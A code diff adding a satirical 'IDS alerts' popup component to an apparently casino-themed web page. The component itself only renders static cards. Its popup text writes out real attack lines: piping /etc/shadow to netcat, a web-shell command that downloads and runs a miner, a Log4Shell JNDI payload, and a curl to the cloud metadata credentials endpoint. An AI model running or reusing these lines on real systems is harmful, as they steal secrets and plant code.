@@ -1,0 +1,190 @@
+---
+import CyberIcon from './CyberIcon.astro';
+---
+
+<!-- FLOATING CHAOS POPUPS CONTAINER -->
+<div id="chaos-popups-layer" class="fixed inset-0 pointer-events-none z-50 overflow-hidden"></div>
+
+<!-- DISCREET TOGGLE IN BOTTOM RIGHT TO MUTE/UNMUTE INTRUSION POPUPS -->
+<div class="fixed bottom-4 right-4 z-50 flex items-center gap-2">
+  <button
+    id="toggle-chaos-popups-btn"
+    type="button"
+    class="rounded-lg border border-neon-red/50 bg-obsidian/95 px-3 py-1.5 text-[10px] font-mono font-bold uppercase tracking-wider text-neon-red shadow-lg hover:bg-neon-red hover:text-white transition flex items-center gap-1.5"
+    title="Toggle Intrusion Popups"
+  >
+    <span class="h-2 w-2 rounded-full bg-neon-red animate-ping" id="chaos-indicator-dot"></span>
+    <span id="chaos-toggle-label">IDS ALERTS: ACTIVE</span>
+  </button>
+</div>
+
+<script is:inline>
+  (() => {
+    const layer = document.getElementById('chaos-popups-layer');
+    const toggleBtn = document.getElementById('toggle-chaos-popups-btn');
+    const toggleLabel = document.getElementById('chaos-toggle-label');
+    const dot = document.getElementById('chaos-indicator-dot');
+
+    if (!layer) return;
+
+    let muted = window.sessionStorage.getItem('sshcasino_chaos_muted') === '1';
+
+    function updateToggleUI() {
+      if (!toggleLabel || !dot) return;
+      if (muted) {
+        toggleLabel.textContent = 'IDS ALERTS: MUTED';
+        dot.className = 'h-2 w-2 rounded-full bg-slate-500';
+        layer.innerHTML = '';
+      } else {
+        toggleLabel.textContent = 'IDS ALERTS: ACTIVE';
+        dot.className = 'h-2 w-2 rounded-full bg-neon-red animate-ping';
+      }
+    }
+    updateToggleUI();
+
+    if (toggleBtn) {
+      toggleBtn.addEventListener('click', () => {
+        muted = !muted;
+        window.sessionStorage.setItem('sshcasino_chaos_muted', muted ? '1' : '0');
+        updateToggleUI();
+        if (!muted) spawnPopup();
+      });
+    }
+
+    const popupsPool = [
+      {
+        header: 'APT-29 // RUSSIAN SPIES INBOUND',
+        border: 'border-neon-red',
+        headerBg: 'bg-neon-red text-white',
+        badge: 'FSB_COZY_BEAR_VIP',
+        title: '3 HOT RUSSIAN SPIES IN YOUR SUBNET ARE TARGETING YOUR id_rsa RIGHT NOW!',
+        body: 'Origin: 185.220.101.44 (Moscow Exit Node) • Attempting 4,200 root brute-force handshakes/sec on Port 22.',
+        cli: 'sshd[1337]: Accepted publickey for root from 185.220.101.44 port 59102 ssh2: RSA SHA256:CozyBear777',
+        btnPrimary: 'BET MY BASTION AGAINST THEM',
+        btnSecondary: 'IGNORE & CHMOD 777'
+      },
+      {
+        header: 'LAZARUS GROUP // NORTH KOREA IN YOUR NGINX',
+        border: 'border-neon-gold',
+        headerBg: 'bg-neon-gold text-obsidian',
+        badge: 'PYONGYANG_WORKER_PROCESS',
+        title: 'NORTH KOREA IS INSIDE YOUR NGINX.CONF! Reverse Proxy Hijacked to Mine Monero!',
+        body: 'Worker process `nginx: worker process (lazarus_dumper)` just rewrote your upstream load balancer to Pyongyang.',
+        cli: 'location /checkout { proxy_pass http://175.45.176.14:8080/kim-jong-crypto-pool; }',
+        btnPrimary: 'SPIN ROULETTE TO EVICT',
+        btnSecondary: 'RELOAD NGINX ANYWAY'
+      },
+      {
+        header: 'RCE EXPLOIT // PHP2SHELL C99 BACKDOOR',
+        border: 'border-neon-green',
+        headerBg: 'bg-neon-green text-obsidian',
+        badge: 'UID=33(www-data) -> UID=0(root)',
+        title: 'CRITICAL: php2shell (`c99_madspot_v4.php`) UPLOADED TO /var/www/html/uploads/avatar.php.jpg!',
+        body: 'Remote attacker executed `passthru("cat /etc/shadow | nc 91.108.4.1 4444")` via unpatched WordPress plugin.',
+        cli: 'GET /uploads/c99.php?cmd=wget+http://darkweb.local/xmrig+-O+/tmp/kworker;chmod+x+/tmp/kworker',
+        btnPrimary: 'DOUBLE DOWN ON PHP 5.4',
+        btnSecondary: 'ACCEPT SHELL'
+      },
+      {
+        header: 'ZERO-DAY CASINO BONUS // LOG4SHELL JACKPOT',
+        border: 'border-neon-cyan',
+        headerBg: 'bg-neon-cyan text-obsidian',
+        badge: 'JNDI:LDAP://0.0.0.0:1389',
+        title: 'CONGRATULATIONS! Your User-Agent header just won a FREE Remote Code Execution!',
+        body: 'Someone typed `${jndi:ldap://evil.casino/Exploit}` into your search bar and unlocked the entire AWS Metadata endpoint!',
+        cli: 'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/prod-admin-role',
+        btnPrimary: 'CLAIM FREE CVE-2021-44228',
+        btnSecondary: 'SNOOZE PAGERDUTY'
+      },
+      {
+        header: 'BGP HIJACK ALERT // AS-666 ROUTE LEAK',
+        border: 'border-pink-500',
+        headerBg: 'bg-pink-500 text-white',
+        badge: 'SUBNET_STOLEN',
+        title: 'YOUR /24 PRODUCTION IP BLOCK IS NOW ROUTING THROUGH TEHRAN & MINSK!',
+        body: 'A rogue ISP just announced your ASN with a shorter AS-PATH. All customer TLS traffic is being MITM-inspected.',
+        cli: 'bgp-daemon[99]: Peer 77.88.1.1 announced 0.0.0.0/0 -> Next-Hop: /dev/null',
+        btnPrimary: 'GO ALL-IN ON BGP POKER',
+        btnSecondary: 'BLAME DNS'
+      }
+    ];
+
+    let popupIndex = 0;
+    let activeCount = 0;
+
+    function spawnPopup() {
+      if (muted || activeCount >= 1) return;
+
+      const item = popupsPool[popupIndex % popupsPool.length];
+      popupIndex++;
+      activeCount++;
+
+      const card = document.createElement('div');
+      // Randomize position slightly on screen (avoiding dead center so 3D canvas stays usable)
+      const positions = [
+        'top-24 right-4 sm:right-8',
+        'bottom-20 right-4 sm:right-10',
+        'top-32 left-4 sm:left-8',
+      ];
+      const posClass = positions[popupIndex % positions.length];
+
+      card.className = `pointer-events-auto fixed ${posClass} w-[92vw] max-w-md rounded-xl border-2 ${item.border} bg-[#06090e]/95 backdrop-blur-xl shadow-2xl transition-all duration-300 transform scale-95 opacity-0`;
+
+      card.innerHTML = `
+        <div class="${item.headerBg} px-3.5 py-1.5 flex items-center justify-between font-mono text-[11px] font-black uppercase tracking-wider rounded-t-lg">
+          <div class="flex items-center gap-2 truncate">
+            <span>[!] ${item.header}</span>
+          </div>
+          <button type="button" class="popup-close-x ml-2 px-1.5 py-0.5 rounded bg-black/30 hover:bg-black/60 text-xs font-mono leading-none cursor-pointer">✕</button>
+        </div>
+        <div class="p-4 space-y-3 font-mono">
+          <div class="flex items-center justify-between text-[10px] text-slate-400">
+            <span class="px-2 py-0.5 rounded bg-slate-800 text-neon-gold font-bold">${item.badge}</span>
+            <span class="text-neon-red animate-pulse">● LIVE INTRUSION</span>
+          </div>
+          <h4 class="text-xs sm:text-sm font-bold text-white leading-snug">
+            ${item.title}
+          </h4>
+          <p class="text-[11px] text-slate-300 leading-relaxed font-sans">
+            ${item.body}
+          </p>
+          <div class="rounded-lg bg-black border border-slate-800 p-2.5 text-[10px] text-neon-green overflow-x-auto whitespace-nowrap">
+            $ ${item.cli}
+          </div>
+          <div class="flex items-center gap-2 pt-1">
+            <a href="https://system4us.com" target="_blank" rel="noopener noreferrer" class="flex-1 text-center rounded-lg bg-neon-red hover:bg-neon-gold hover:text-obsidian text-white py-2 px-2.5 text-[10px] font-black uppercase tracking-wider transition">
+              ${item.btnPrimary}
+            </a>
+            <button type="button" class="popup-dismiss-btn rounded-lg border border-slate-700 bg-obsidian hover:border-neon-green text-slate-300 hover:text-neon-green py-2 px-3 text-[10px] font-bold uppercase tracking-wider transition cursor-pointer">
+              ${item.btnSecondary}
+            </button>
+          </div>
+        </div>
+      `;
+
+      layer.appendChild(card);
+
+      requestAnimationFrame(() => {
+        card.classList.remove('scale-95', 'opacity-0');
+        card.classList.add('scale-100', 'opacity-100');
+      });
+
+      const closePopup = () => {
+        card.classList.add('scale-95', 'opacity-0');
+        setTimeout(() => {
+          if (card.parentNode) card.parentNode.removeChild(card);
+          activeCount = Math.max(0, activeCount - 1);
+        }, 200);
+      };
+
+      const closeX = card.querySelector('.popup-close-x');
+      const dismissBtn = card.querySelector('.popup-dismiss-btn');
+      if (closeX) closeX.addEventListener('click', closePopup);
+      if (dismissBtn) dismissBtn.addEventListener('click', closePopup);
+    }
+
+    // First popup after 18 seconds, then every 42 seconds (maximum 1 active at a time)
+    setTimeout(spawnPopup, 18000);
+    setInterval(spawnPopup, 42000);
+  })();
+</script>
